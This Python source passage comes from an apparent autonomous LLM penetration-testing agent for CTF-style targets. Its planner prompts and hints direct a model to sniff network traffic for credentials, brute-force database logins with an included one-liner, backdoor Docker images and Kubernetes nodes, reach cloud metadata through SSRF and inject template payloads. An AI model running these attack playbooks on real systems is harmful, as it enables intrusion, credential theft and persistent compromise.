                    "source": "credential-hint",
                })

        # ── Session-aware hint: suggest network discovery ─────────
        # When SSH access was gained (Session nodes exist) but the plan
        # has no network recon tasks, inject a hint.  Shared-network
        # containers are common in Docker/K8S scenarios — sniffing the
        # bridge network can capture credentials, tokens, and flags.
        _sessions = self.dkg.query_nodes("Session")
        if _sessions and tasks:
            _has_net_task = any(
                str(t.get("tool", "")).lower() in (
                    "tcpdump_capture", "shell_exec",
                ) and any(
                    kw in str(t.get("instruction", "")).lower()
                    for kw in ("tcpdump", "ip addr", "netstat", "ss ", "arp",
                               "network", "sniff", "ngrep", "bridge")
                )
                for t in tasks
            )
            if not _has_net_task:
                # Pull host/user from Session, password from Credential
                _sess = _sessions[0]
                _sess_host = _sess.get("host", self.target_host)
                _sess_user = _sess.get("user", "")
                _sess_port = 22
                _sess_pass = _resolved_pass
                # Try to get port and password from credentials
                _creds = self.dkg.query_nodes("Credential")
                for _c in _creds:
                    if _c.get("username") == _sess_user or not _sess_user:
                        _sess_user = _sess_user or _c.get("username", "")
                        _sess_pass = _sess_pass or _c.get("password", "")
                        _cp = _c.get("port", 0)
                        if _cp:
                            _sess_port = int(_cp)
                        break
                _net_hint = (
                    "You have an active shell session. Before hunting for "
                    "flags locally, check the NETWORK — containers often "
                    "share a bridge network with other services. Run: "
                    "ip addr (discover interfaces/gateways), "
                    "ss -tlnp / netstat -tlnp (listening ports on other hosts), "
                    "and tcpdump_capture with filter='tcp port 5000 or tcp port 80' "
                    "(sniff HTTP traffic for tokens/credentials). "
                    "The flag may be in transit between containers, not on disk."
                )
                tasks.append({
                    "id": "task-net-discovery-hint",
                    "instruction": _net_hint,
                    "tool": "ssh_exec",
                    "params": {
                        "host": _sess_host,
                        "port": _sess_port,
                        "username": _sess_user or "root",
                        "password": _sess_pass,
                        "command": "ip addr && ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null",
                    },
                    "dependent_task_ids": [],
                    "status": "pending",
                    "source": "session-hint",
                })

        # ── Post-generation: shell_exec → specialized tool correction ─
        # shell_exec is the LLM's generic fallback for tasks that have a
        # dedicated tool.  Rewrite only when the replacement is (a) runnable
        # on this host and (b) fully parameterisable from the original task;
        # otherwise the original command stays intact.  Rewriting into a tool
        # whose binary is missing — or dropping the command and leaving empty
        # params — turns a workable task into a guaranteed failure.
        def _first_url(text: str) -> str:
            match = re.search(r"https?://[^\s'\"]+", text)
            return match.group(0).rstrip(").,;\"'") if match else ""

        def _aws_params(command: str) -> dict | None:
            match = re.search(r"\baws\s+([a-z0-9-]+)\s+([a-z0-9-]+)", command)
            if not match:
                return None
            return {"service": match.group(1), "action": match.group(2)}

        def _ready(replacement: str, params: dict) -> bool:
            spec = _tool_specs.get(replacement)
            if spec is None or not is_available(spec):
                return False
            return all(str(params.get(req, "")).strip() for req in spec.required)

        def _rewrite(task: dict, replacement: str, params: dict, note: str) -> None:
            task["tool"] = replacement
            task["params"] = params
            task["instruction"] = (
                f"[auto-corrected: shell_exec->{replacement} ({note})] "
                f"{task.get('instruction', '')}"
            )

        for t in tasks:
            if t.get("tool") != "shell_exec" or t.get("status") not in (None, "", "pending"):
                continue
            _inst = str(t.get("instruction", "")).lower()
            _raw_cmd = str(t.get("params", {}).get("command", "") or "")
            _cmd = _raw_cmd.lower()
            _combined = f"{_inst} {_cmd}"
            _url = _first_url(_raw_cmd) or _first_url(str(t.get("instruction", "")))
            _aws = _aws_params(_cmd)

            # S3 / AWS operations → aws_cli or curl_get
            if any(kw in _combined for kw in ("s3 ", "s3:", "bucket", "list-buckets",
                                               "list-objects", "aws s3", "object storage")):
                if _ready("aws_cli", _aws or {}):
                    _rewrite(t, "aws_cli", _aws, "S3/object storage")
                elif _url and _ready("curl_get", {"url": _url}):
                    _rewrite(t, "curl_get", {"url": _url}, "S3/object storage")
                continue

            # AWS IAM / STS / credential operations → aws_cli
            if any(kw in _combined for kw in ("aws ", "iam ", "sts ", "lambda ",
                                               "accesskeyid", "secretaccesskey",
                                               "list-roles", "get-caller-identity",
                                               "assume-role", "aws cli")):
                if _ready("aws_cli", _aws or {}):
                    _rewrite(t, "aws_cli", _aws, "AWS cloud operation")
                else:
                    log.info(
                        "Keeping shell_exec for task %s: aws_cli unavailable or "
                        "service/action not derivable", t.get("id", "?"),
                    )
                continue

            # curl-based HTTP operations → curl_get
            if _cmd.strip().startswith("curl ") and "aws " not in _cmd and _url:
                if _ready("curl_get", {"url": _url}):
                    _rewrite(t, "curl_get", {"url": _url}, "curl in shell_exec")

        # ── Write back to typed Task objects ──────────────────────
        for t, d in zip(_plan_tasks, tasks[: len(_plan_tasks)]):
            action = dict(t.action or {})
            action["tool"] = str(d.get("tool", "") or "")
            _params = d.get("params")
            if isinstance(_params, dict):
                action["params"] = _params
            t.action = action
            t.instruction = d.get("instruction", t.instruction)
            if str(d.get("status", "")) == "skipped":
                t.status = TaskStatus.ABANDONED
        # Newly appended hint tasks (credential/session hints) become Tasks.
        for d in tasks[len(_plan_tasks):]:
            _plan_tasks.append(
                Task(
                    id=str(d.get("id", "")),
                    type="task",
                    goal=d.get("goal", "") or d.get("instruction", "") or "",
                    instruction=str(d.get("instruction", "") or ""),
                    action={
                        "tool": str(d.get("tool", "") or ""),
                        "target": str(d.get("endpoint", "") or ""),
                        "params": dict(d.get("params") or {})
                        if isinstance(d.get("params"), dict)
                        else {},
                    },
                    dependencies=deps_from_task_ids(
                        d.get("dependent_task_ids") or d.get("dependencies") or []
                    ),
                    status=(
                        TaskStatus.ABANDONED
                        if str(d.get("status", "")) == "skipped"
                        else TaskStatus.READY
                    ),
                    source=str(d.get("source", "") or ""),
                    vuln_type=str(d.get("vuln_type", "") or ""),
                    source_knowledge_ids=[
                        str(item) for item in (d.get("source_knowledge_ids") or [])
                    ],
                )
            )
        # Sync appended hint tasks back to the caller's list.
        _caller_list[:] = _plan_tasks

    async def _generate_structured(
        self,
        stage: str,
        prompt: str,
        validator: Any,
        schema_example: str = "",
        system_prompt: str | None = None,
        max_attempts: int = 2,
    ) -> tuple[str, Any | None, str]:
        """Single-shot structured generation with schema repair.

        Unlike the old registry-lookup loop, no tools are exposed to the
        model here: the caller embeds the needed tool contracts directly in
        ``prompt``.  ``validator(content)`` must return ``(parsed, err)``.

        Returns ``(content, parsed, err)`` — ``parsed`` is ``None`` when every
        attempt failed validation; the concrete schema error is always echoed
        to stdout so result files expose the failure instead of silently
        degrading.
        """
        def _llm_timeout(default: float = 60.0) -> float:
            return max(1.0, min(default, float(self._remaining_budget())))

        def _isolated():
            """Run these self-contained prompts without the session history.

            Each structured prompt carries its own world state, so continuing
            the shared conversation only makes the call slower.  Test doubles
            without ``isolated_scope`` simply run unchanged.
            """
            scope = getattr(self.llm, "isolated_scope", None)
            return scope() if callable(scope) else contextlib.nullcontext()

        content = ""
        err = ""
        _timed_out = False
        for attempt in range(1, max_attempts + 1):
            if self._remaining_budget() < self._llm_min_remaining():
                log.info(
                    "Structured generation stage=%s skipped: %.0fs of budget "
                    "left (minimum %.0fs)",
                    stage, self._remaining_budget(), self._llm_min_remaining(),
                )
                self._task_log_event(
                    "info", "llm_skipped_low_budget", stage=stage,
                    remaining_s=round(self._remaining_budget(), 1),
                )
                break
            attempt_prompt = prompt
            if attempt > 1 and not _timed_out:
                attempt_prompt = (
                    f"{prompt}\n\n[SCHEMA REPAIR ATTEMPT {attempt}/{max_attempts}]\n"
                    "Your previous response was rejected because it does not match "
                    "the required JSON schema.\n"
                    + (f"Schema reference:\n{schema_example}\n" if schema_example else "")
                    + f"Validation errors:\n{err[:1200]}\n"
                    + "Return the corrected response as ONLY the required JSON. "
                      "No markdown, no extra keys, no commentary."
                )
            timeout = _llm_timeout()
            if _timed_out:
                # A timeout is a latency problem, not a schema problem:
                # retry the same prompt with a longer budget instead of
                # telling the model its (never-seen) output was invalid.
                timeout = _llm_timeout(120.0)
            log.info(
                "Structured generation stage=%s attempt=%d/%d timeout=%.0fs "
                "(compact tool-contract card in prompt)",
                stage, attempt, max_attempts, timeout,
            )
            try:
                with _isolated():
                    content, _ = await self._llm_generate_async(
                        prompt=attempt_prompt,
                        system_prompt=system_prompt,
                        stage=stage,
                        timeout=timeout,
                    )
                _timed_out = False
            except asyncio.TimeoutError:
                err = "LLM call timed out"
                _timed_out = True
                log.warning("Structured %s attempt %d timed out", stage, attempt)
                continue
            except Exception as exc:  # noqa: BLE001 - surfaced to repair loop
                err = f"LLM call failed: {exc}"
                log.warning("Structured %s attempt %d failed: %s", stage, attempt, exc)
                continue
            if not content or not str(content).strip():
                err = "empty response (no content)"
                continue
            parsed, err = validator(content)
            if parsed is not None:
                return content, parsed, ""
            log.warning(
                "Structured %s attempt %d rejected: %s", stage, attempt, err[:300],
            )

        print(f"[SCHEMA] {stage}: invalid after {max_attempts} attempt(s) — {err[:400]}",
              flush=True)
        return content, None, err

    async def _generate_exploitation_plan(self, target_url: str, cteg_hints: dict | None = None) -> ExploitationPlan:
        """Generate a structured plan from bootstrap state (nmap results only).

        Called at the start of _run_with_runtime(). The LLM receives bootstrap
        nmap data, all tools (recon + attack), and decides what to do first.
        """
        plan_id = f"plan-{int(time.time())}"
        plan = ExploitationPlan(
            plan_id=plan_id, phase="explore", goal=f"Capture flag on {target_url}",
            status="in_progress", created_at=time.strftime("%Y-%m-%dT%H:%M:%S"),
        )

        state = self._get_state()

        # Services context
        services_lines = []
        for s in state.services:
            if s.port:
                skip = " [skip]" if s.skip_exploit else ""
                services_lines.append(
                    f"  port {s.port}/{s.protocol}: {s.version or s.banner}{skip}"
                )

        # Phase summary from prior loops
        phase_summary = ""
        summaries = self.dkg.query_nodes("PlanSummary")
        if summaries:
            phase_summary = "\n## Previous Loop Summary\n"
            for s in summaries[-2:]:
                _kf = s.get('key_findings', '')
                if isinstance(_kf, dict):
                    _kf = json.dumps(_kf, ensure_ascii=False)
                phase_summary += f"- {s.get('phase','')}: {str(_kf)[:300]}\n"

        # ── RAG knowledge injection (hybrid retrieval, gated) ───────
        # Retrieval is hybrid (dense + BM25) then cross-encoder reranked and
        # gated: it returns at most rag.max_results candidates that fit the
        # target environment, or nothing at all. Environment-incompatible
        # knowledge (Kubernetes techniques on a public-cloud target) is filtered
        # out instead of being offered as a suggestion.
        rag_context = ""
        try:
            from darwin.rag import get_rag
            from darwin.rag_query import (
                build_capability_query,
                domains_from_dkg,
                environment_from_dkg,
            )
            from darwin.precedent_store import current_prior
            rag = get_rag()
            if rag and rag.loaded:
                query = build_capability_query(
                    services=state.services[:4],
                    vulns=self.vulnerabilities[:4],
                    observations=[str(n)[:160] for n in state.analysis_notes[-3:]],
                )
                environment = environment_from_dkg(self.dkg)
                domains = domains_from_dkg(self.dkg)
                results = rag.retrieve(
                    query, environment=environment, domains=domains,
                    prior=current_prior(),
                )
                if results:
                    lines = ["\n## Candidate Techniques (RAG, unverified)\n"]
                    for r in results:
                        tags = "/".join(r.get("domains") or [])
                        requires = "/".join(r.get("requires_environment") or [])
                        header = f"- **{r.get('title', '')}** [{tags}]"
                        if requires:
                            header += f" (environment: {requires})"
                        lines.append(header)
                        if r.get("applies_when"):
                            lines.append("  Applies when: " + "; ".join(
                                str(x) for x in r["applies_when"][:3]))
                        if r.get("technique_class"):
                            lines.append("  Technique class: " + "; ".join(
                                str(x) for x in r["technique_class"][:3]))
                        if r.get("signals"):
                            lines.append("  Look for: " + "; ".join(
                                str(x) for x in r["signals"][:2]))
                        if r.get("verification"):
                            lines.append("  Verify by: " + str(r["verification"])[:200])
                        if r.get("failure_boundary"):
                            lines.append("  Not applicable if: " + "; ".join(
                                str(x) for x in r["failure_boundary"][:2]))
                        lines.append("")
                    lines.append(
                        "These are candidate technique classes, not target-verified "
                        "evidence. Adapt each one to what the target actually returns; "
                        "discard any entry whose applies-when/not-applicable condition does "
                        "not match the observed fingerprint, and never treat a candidate as "
                        "proof that the target is vulnerable."
                    )
                    rag_context = "\n".join(lines)
                    log.info(
                        "Plan RAG: %d candidate(s) env=%r domains=%s query=%r",
                        len(results), environment or "unknown", domains, query[:120],
                    )
        except Exception as exc:
            # This block feeds the plan prompt: swallowing it silently hid a
            # NameError for weeks and left every plan without RAG knowledge.
            log.warning("Plan RAG injection failed: %s", exc, exc_info=True)

        # If retrieval returned nothing, say so explicitly: the planner must then
        # rely on reconnaissance evidence instead of on unrelated knowledge.
        if not rag_context:
            rag_context = ("\n## Candidate Techniques (RAG, unverified)\n"
                           "No stored technique fits this target fingerprint and "
                           "environment. Plan from the reconnaissance evidence and "
                           "general reasoning; do not assume a known exploitation path "
                           "exists.\n")

        # ── Artifact → Tool Bridge ──────────────────────────────────
        # Scan DKG for discovered artifacts (AWS credentials, private
        # keys, cloud endpoints) and build explicit tool-to-artifact
        # recommendations.  Without this structural bridge the LLM
        # often fails to connect "found a private key" → "call
        # saml_forge", or "STS endpoint" → "call aws_sts_query".
        _artifact_lines: list[str] = []
        _artifact_seen: set[str] = set()  # deduplicate by category
        # (a) Credential nodes — check for cloud cred types
        for cred in self.dkg.query_nodes("Credential"):
            ct = str(cred.get("cred_type", "")).lower()
            cuser = str(cred.get("username", "") or "")
            cpass = str(cred.get("password", "") or "")
            if ("aws" in ct or "iam" in ct) and "aws_creds" not in _artifact_seen:
                _artifact_lines.append(
                    "- **AWS credentials discovered** ("
                    + (f"user={cuser}, " if cuser else "")
                    + f"type={ct}): use `aws_cli` with `--endpoint-url` or "
                    + "`aws_sts_query` to enumerate roles; "
                    + "`aws_iam_federation` for assume-role")
                _artifact_seen.add("aws_creds")
            if "private_key" in ct and "private_key" not in _artifact_seen:
                _artifact_lines.append(
                    "- **Private key / PEM discovered**: use `saml_forge` to "
                    + "build a SAML assertion, then `aws_cli` action=assume-role-with-saml "
                    + "or `aws_iam_federation`")
                _artifact_seen.add("private_key")
            if ("token" in ct or "jwt" in ct or "bearer" in ct) and "token" not in _artifact_seen:
                _artifact_lines.append(
                    "- **Token / JWT discovered**: use `jwt_forge` to craft a "
                    + "custom claim, then `aws_iam_federation` action=assume-role-with-web-identity")
                _artifact_seen.add("token")
        # (b) Endpoint nodes — check banners for cloud service signatures
        for ep in self.dkg.query_nodes("Endpoint"):
            banner = str(ep.get("banner", "") or ep.get("sample_response", "") or "").lower()
            url = str(ep.get("url", "") or "").lower()
            _ep_sig = f"{banner} {url}"
            # A documented body field the server executes (script/command/code)
            # is a code-execution surface. Output may be delivered later to a
            # callback URL instead of coming back in the HTTP response, so the
            # plan must pair it with the OOB listener rather than reading the
            # response body for evidence.
            _exec_fields = exec_body_fields(ep.get("params", ""))
            if _exec_fields and "oob_async" not in _artifact_seen:
                _artifact_lines.append(
                    "- **Server-side execution field detected** ("
                    + ", ".join(_exec_fields) + "): the endpoint runs the "
                    + "supplied value as code/script. Output may arrive later on a "
                    + "callback URL instead of in the response — start "
                    + "`oob_listener`, deliver the payload with one of its "
                    + "callback_urls, then `oob_listener` action=read to confirm "
                    + "execution and capture the output.")
                _artifact_seen.add("oob_async")
            if ("s3" in _ep_sig or "object" in banner or "bucket" in banner) and "s3_endpoint" not in _artifact_seen:
                _artifact_lines.append(
                    "- **Object-storage / S3 endpoint detected**: use "
                    + "`object_store_get` to enumerate and retrieve objects")
                _artifact_seen.add("s3_endpoint")
            if ("oidc" in _ep_sig or "openid" in _ep_sig) and "oidc_endpoint" not in _artifact_seen:
                _artifact_lines.append(
                    "- **OIDC IdP endpoint detected**: use `jwt_forge` with "
                    + "wildcard/malformed claims, then `aws_iam_federation` "
                    + "action=assume-role-with-web-identity")
                _artifact_seen.add("oidc_endpoint")
            if ("saml" in _ep_sig or "federation" in _ep_sig) and "saml_endpoint" not in _artifact_seen:
                _artifact_lines.append(
                    "- **SAML federation endpoint detected**: use `saml_forge` "
                    + "to craft assertion, then `aws_iam_federation` "
                    + "action=assume-role-with-saml")
                _artifact_seen.add("saml_endpoint")
            if "sts" in _ep_sig and "sts_endpoint" not in _artifact_seen:
                _artifact_lines.append(
                    "- **STS endpoint detected**: use `aws_sts_query` for "
                    + "direct Query API calls (no AWS CLI needed). If SCP "
                    + "blocks access, try `api_version=2010-05-08` (pre-SCP legacy)")
                _artifact_seen.add("sts_endpoint")
            if registry_signal(_ep_sig) and "docker_registry" not in _artifact_seen:
                _artifact_lines.append(
                    "- **Docker Registry v2 API detected**: use `docker_registry` "
                    + "to pull, modify (backdoor), and push images. Then use "
                    + "`kubectl_get_pods` + `kubectl_exec` to trigger pod restart "
                    + "and read flag from the compromised container.")
                _artifact_seen.add("docker_registry")
        # (b2) Service map — a discovered registry port with a registry-ish
        # label is registry evidence even before its /v2/ API was probed.
        if "docker_registry" not in _artifact_seen:
            for svc in self.dkg.query_nodes("Service"):
                if int(svc.get("port", 0) or 0) not in (5000, 5001):
                    continue
                _svc_sig = " ".join(
                    str(svc.get(k, "") or "")
                    for k in ("service_name", "version", "banner", "fingerprint")
                ).lower()
                if "registry" in _svc_sig or "docker" in _svc_sig:
                    _artifact_lines.append(
                        "- **Docker Registry service detected**: use `docker_registry` "
                        + "to pull, modify (backdoor), and push images, then restart "
                        + "the consuming workload to read the flag.")
                    _artifact_seen.add("docker_registry")
                    break
        # (c) Analysis / Vulnerability nodes — check for PEM keys in evidence
        for an in self.dkg.query_nodes("Analysis"):
            ev = str(an.get("evidence", "") or an.get("summary", "") or an.get("findings", "") or "")
            if "-----BEGIN" in ev and "pem_key" not in _artifact_seen:
                _artifact_lines.append(
                    "- **PEM/private key found in analysis output**: use "
                    + "`saml_forge` to build SAML assertion, then "
                    + "`aws_cli` action=assume-role-with-saml")
                _artifact_seen.add("pem_key")
                break
        # (c2) Kubernetes access facts — the kubectl identity's rights decide
        # which cluster-side paths are reachable at all.
        _k8s_access: set[str] = set()
        for host in self.dkg.query_nodes("Host"):
            for tag in (host.get("k8s_access") or []):
                _k8s_access.add(str(tag))
        _exited_pods = [
            pod for pod in self.dkg.query_nodes("K8sPod")
            if str(pod.get("phase", "") or "").strip().lower()
            in ("succeeded", "failed", "completed")
        ]
        if _exited_pods and "k8s_exited_pod" not in _artifact_seen:
            _pod_names = ", ".join(
                f"{pod.get('namespace', 'default')}/{pod.get('name', '?')}"
                for pod in _exited_pods[:5]
            )
            _artifact_lines.append(
                f"- **Exited workload(s) detected** ({_pod_names}): read their "
                + "logs with `kubectl_logs` before planning an exploit — a pod "
                + "that already ran its command may have printed the flag.")
            _artifact_seen.add("k8s_exited_pod")
        if ({"cluster-admin", "create-pods"} & _k8s_access
                and "k8s_pod_create" not in _artifact_seen):
            _artifact_lines.append(
                "- **kubectl identity can create pods ("
                + ", ".join(sorted(_k8s_access)) + ")**: to read node-local files "
                + "(hostPath /), deploy `k8s_backdoor_daemonset` with an image "
                + "already present on the node and collect its output with "
                + "`kubectl_logs`.")
            _artifact_seen.add("k8s_pod_create")
        # (d) Vulnerability nodes — type-based hints
        for vn in self.dkg.query_nodes("Vulnerability"):
            vt = str(vn.get("vuln_type", "") or "").lower()
            if "ssrf" in vt and "ssrf_hint" not in _artifact_seen:
                _artifact_lines.append(
                    "- **SSRF vulnerability confirmed**: probe internal "
                    + "services (IMDS 169.254.169.254, localhost, Docker "
                    + "bridge). If credentials are returned, feed them to "
                    + "`aws_cli` / `object_store_get` / `aws_sts_query`")
                _artifact_seen.add("ssrf_hint")
            if ("cloudformation" in vt or "template" in vt) and "cf_hint" not in _artifact_seen:
                _artifact_lines.append(
                    "- **CloudFormation / template injection**: test "
                    + "Fn::Sub payloads like `${/secure/flag}` or "
                    + "`{{resolve:ssm:/secure/flag}}` via `send_payload`")
                _artifact_seen.add("cf_hint")

        _artifact_bridge = ""
        if _artifact_lines:
            _artifact_bridge = (
                "\n## Discovered Artifacts → Recommended Tools\n"
                + "\n".join(_artifact_lines) + "\n"
                + "**CRITICAL: These tool mappings are derived from artifacts "
                + "you have ALREADY discovered.  Use them in your plan tasks.**\n"
            )
            log.info("[ARTIFACT-BRIDGE] %d recommendations: %s",
                     len(_artifact_lines), ", ".join(sorted(_artifact_seen)))

        _all_tool_defs: list[dict] = []
        for _gw in (self.attack_gateway, self.recon_gateway):
            try:
                _all_tool_defs.extend(_gw.get_tool_definitions())
            except Exception as exc:
                log.debug("swallowed exception: %s", exc, exc_info=True)
        _tool_card = render_tool_contract_card(_all_tool_defs)

        # Tool candidates derived from the current hypotheses.
        _candidate_tools: list[str] = []
        for _v in self.vulnerabilities:
            if _v.suggested_tool and _v.suggested_tool not in _candidate_tools:
                _candidate_tools.append(_v.suggested_tool)
            _gt = self._guess_tool(_v.vuln_type, endpoint=_v.endpoint or "")
            if _gt and _gt not in _candidate_tools:
                _candidate_tools.append(_gt)
        _candidate_tools_section = (
            "\n## Tool Candidates (for the current hypotheses)\n"
            "Candidate tools: "
            + (", ".join(_candidate_tools) if _candidate_tools else "(none)")
            + "\nUse EXACT names and parameters from the Tool Contract Card below.\n"
        )
        _self_describing = any(
            ep.sample_response.startswith("{")
            and '"endpoints"' in ep.sample_response
            for ep in state.endpoints
        )

        # P4: gated CTEG hints finally reach the plan LLM. cteg_hints is
        # already filtered by scenario overlap upstream (strict gate); render
        # it verbatim, and nothing at all when it is empty.
        _cteg_block = ""
        if cteg_hints and (
            cteg_hints.get("bypass_strategies")
            or cteg_hints.get("exploit_strategies")
            or cteg_hints.get("known_credentials")
        ):
            _cteg_block = (
                "\n## Prior Cross-Task Experience (matched)\n"
                + json.dumps(cteg_hints, indent=2, ensure_ascii=False)
            )

        try:
            _topology_context = self._belief_context(compact=True)
        except Exception:
            _topology_context = ""

        prompt = f"""Target: {target_url}

## Discovered Services (from nmap)
{chr(10).join(services_lines) if services_lines else '(none)'}

## Current State
- {len(state.endpoints)} endpoints discovered so far
- {len(state.services)} services detected
- Credentials: {len(state.credentials)} known
- API self-describing: {'YES' if _self_describing else 'no'}
{phase_summary}{_cteg_block}
{_topology_context}
## Analyzed Vulnerabilities
{self._format_vulnerability_summary()}
{rag_context}
{_artifact_bridge}
{self._build_defense_evasion_context()}
## Synthesizing Knowledge into Attack Tasks
You have received multiple intelligence sources above:
- Vulnerability hypotheses from the analysis phase
- Candidate technique classes (RAG) that matched the target fingerprint and environment
- Service version information from reconnaissance

Your job: COMBINE these sources when designing each task.
**Unfamiliar services/technologies:** When you are not certain how to exploit a discovered
service, use the candidate technique classes above as *hypotheses about the technique class*
(protocol shape, applicability conditions, verification method) — then build the concrete
request from what the target actually returns. Do NOT assume the candidate list proves the
target is vulnerable, and do NOT copy payload strings from it: entries describe technique
classes only.
**Weak/default credentials:** The candidate entries list verification methods, not credential
lists. Build the credential batch from the target's own hints (login banners, docs endpoints,
error messages) and general defaults.
- When a candidate fits the observed fingerprint: use its technique class + verification method as the task's approach.
- When no candidate fits (RAG returned nothing): rely on the vulnerability evidence above and general exploitation principles for that vulnerability type.
- Service versions are primary signals: an outdated service with known weaknesses should generate high-priority exploitation tasks targeting those specific weaknesses.
- If the analyze phase produced attack_paths, translate each path into a chain of tasks with dependent_task_ids reflecting the path's step ordering. A 4-step path becomes 4 tasks where each depends on the previous one.
- Tasks targeting DIFFERENT services or vulnerabilities with no shared prerequisites should have empty dependent_task_ids so they can execute in parallel.
- If 'API self-describing: YES', the root response already documented every route — do NOT
  add directory enumeration, route fuzzing, dirb, gobuster or ffuf tasks for those services.
- **Write-intent tasks** (publish / register / create / overwrite / upload): the task MUST
  use a tool that can express the verb (`http_method_probe` with method=PUT/POST/PATCH, or
  `http_post` with method=PUT) and MUST carry a `probe` success_condition that reads the
  artifact back. When research gives an exact verb + route, use it verbatim in
  params.url instead of renaming it to a collection route.

## Tool Contract Card (use these EXACT tool names and parameters)
{_tool_card}
{_candidate_tools_section}

## Task
Generate a plan as a JSON array of EXPLOIT tasks. Reconnaissance and research
have already been completed. Each task should test or exploit a vulnerability:
- id: unique string (e.g. "task-1")
- dependent_task_ids: list of task IDs that must complete first
- instruction: what to exploit and how
- tool: exact exploit tool name (sqlmap_test, command_injection_test, etc.)
- params: tool parameters dict
- reason: which vulnerability this targets
- priority (optional): 0.0-1.0 execution priority hint

**Task object contract**: each task MUST contain ONLY these keys:
id, dependent_task_ids, instruction, tool, params, success_condition,
reason, priority.
Do NOT include "status", "dependencies", or any other key — the system
owns task status. dependent_task_ids is a JSON array of strings (empty
array for independent tasks). params is a JSON object of tool arguments.

{SUCCESS_CONDITION_GUIDE}

**CRITICAL: Generate at most 15 tasks.** Include diverse attack strategies
(SQLi, XSS, CMDi, LFI, file upload, auth bypass, etc.) even for medium-confidence
vulnerabilities. The system can handle many parallel tasks.

**For WeakAuth / default credential vulnerabilities:** Do NOT create individual tasks
for each credential pair — this wastes iterations. Create a SINGLE shell_exec task
that uses a Python one-liner to batch-test ALL credential combinations at once.
Example for PostgreSQL:
```json
{{"id": "task-cred-batch", "dependent_task_ids": [],
 "instruction": "Batch-test all PostgreSQL credential combinations in ONE shell_exec call. Use Python subprocess with PGPASSWORD env var. Test common combos: (postgres,postgres), (postgres,''), (postgres,password), (postgres,admin), (postgres,password123), (postgres,postgresql). Print SUCCESS: for any working pair.",
 "tool": "shell_exec", "params": {{"command": "python3 -c \"import subprocess,os; combos=[('postgres','postgres'),('postgres',''),('postgres','password'),('postgres','admin'),('postgres','password123')]; [print(f'SUCCESS: {{u}}:{{p}}') if subprocess.run(['psql','-h','HOST','-p','PORT','-U',u,'-w','-c','SELECT 1'],env={{**os.environ,'PGPASSWORD':p}},capture_output=True).returncode==0 else None for u,p in combos]\""}}}}
```
This reduces 10+ sequential LLM roundtrips to 1 single tool execution.
Then add tasks for authenticated enumeration and data extraction depending on task-cred-batch.

## Dependency Rules (use dependent_task_ids to build a DAG)
Create meaningful task dependencies when:
1. **Credential-first**: tasks that use credentials (e.g. ssh, login) MUST depend
   on credential discovery/verification tasks.
2. **Foothold-first**: lateral movement tasks MUST depend on initial compromise.
3. **Parameter confirmation**: exploit tasks targeting a specific parameter SHOULD
   depend on tasks that confirm that parameter is injectable.
4. **Independent tasks**: exploit tasks targeting DIFFERENT endpoints/services with
   no shared prerequisites SHOULD have empty dependent_task_ids (run in parallel).

Example DAG for a target with SQLi + CMDi + SSH pivot:
```json
[
  {{"id": "task-1", "dependent_task_ids": [],
   "instruction": "Test SQLi on login endpoint", "tool": "sqlmap_test", ...}},
  {{"id": "task-2", "dependent_task_ids": [],
   "instruction": "Test CMDi on upload endpoint", "tool": "command_injection_test", ...}},
  {{"id": "task-3", "dependent_task_ids": ["task-1", "task-2"],
   "instruction": "Use obtained credentials for SSH pivot",
   "tool": "ssh_execute", ...}}
]
```
task-1 and task-2 run first (parallel, independent). task-3 waits for both.

## Strategy
1. CRITICAL: Create at least one EXPLOITATION task for EVERY vulnerability.
   Recon-only tasks (INFO, KEYS *, CONFIG GET) are NOT sufficient — you MUST
   include the actual exploit steps: CONFIG SET, SET key, SAVE, ssh_exec, etc.
   A plan with only recon tasks will FAIL.
2. Simple exploits needing one tool call (SQLi, XSS, CMDi) need 1 task. Complex
   multi-step exploits (SSH key injection via Redis CONFIG SET→dbfilename→
   SET→SAVE, container escape via check_caps→mount→release_agent, multi-stage
   lateral movement) require a SEPARATE task for EACH atomic step.
   dependencies. Consult the Research/CVEs fields above for technique guidance.
2. Prioritize high-confidence vulnerabilities first.
3. If an exploit succeeds or reveals new information, the plan will be
   updated after each task — new tasks can be added in replanning.
4. Do NOT add curl_get/http_post probing tasks — services have already been
   probed during reconnaissance.
5. **Flag location strategy**: After gaining RCE, try simple flag paths FIRST
   (/flag.txt, /flag, /root/flag.txt, /home/*/flag.txt) before launching
   complex recursive find/grep searches. Simple cat commands are faster and
   avoid timeouts.
6. If a vulnerability's suggested tool is curl_get (for LFI/IDOR/SSRF), use
   curl_get with the exact URL and parameter.

Output ONLY valid JSON array (3-20 tasks depending on complexity. More tasks != better — prefer focused, high-impact exploitation tasks over exhaustive probing)."""

        self._maybe_compress()
        content, _plan_model, _plan_err = await self._orch._generate_structured(
            stage="plan",
            prompt=prompt,
            validator=parse_plan_tasks,
            schema_example=PLANNER_TASKS_SCHEMA_EXAMPLE,
            system_prompt=SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED,
        )
        try:
            if _plan_model is None:
                raw_tasks = [t for t in (self._extract_json_array(content) or []) if isinstance(t, dict)]
                tasks = [self._task_from_llm_dict(t) for t in raw_tasks]
            else:
                tasks = [
                    Task(
                        id=t.id,
                        type="task",
                        goal=t.instruction,
                        instruction=t.instruction,
                        action={"tool": t.tool, "target": "", "params": dict(t.params)},
                        priority=t.priority,
                        dependencies=deps_from_task_ids(t.dependent_task_ids),
                        status=TaskStatus.READY,
                        source=t.source,
                        vuln_type=t.vuln_type,
                        source_knowledge_ids=list(t.source_knowledge_ids),
                        success_condition=normalize_success_condition(
                            t.success_condition
                        ),
                    )
                    for t in _plan_model
                ]
            for task in tasks:
                path_dependency = _attack_path_dependency(task.action, task.instruction)
                if path_dependency and path_dependency not in task.dependencies:
                    task.dependencies.append(path_dependency)
            # Validate tool names against actual registry
            all_valid_tools = (self.attack_gateway.get_tool_names()
                               + self.recon_gateway.get_tool_names())
            # Include MCP tools in validation set
            try:
                all_valid_tools += self.mcp_pool.get_tool_names()
            except Exception as exc:
                log.debug("swallowed exception: %s", exc, exc_info=True)
            for t in tasks:
                tool = str((t.action or {}).get("tool", "") or "")
                if tool and tool not in all_valid_tools:
                    from difflib import get_close_matches
                    matches = get_close_matches(tool, all_valid_tools, n=1, cutoff=0.3)
                    if matches:
                        log.info("Plan: corrected tool '%s' → '%s'", tool, matches[0])
                        t.action["tool"] = matches[0]
                    else:
                        log.warning("Plan: unknown tool '%s' — removing from plan", tool)
                        t.action["tool"] = self._guess_tool(
                            t.vuln_type,
                            endpoint=str(
                                (t.action.get("params") or {}).get(
                                    "url", (t.action.get("params") or {}).get(
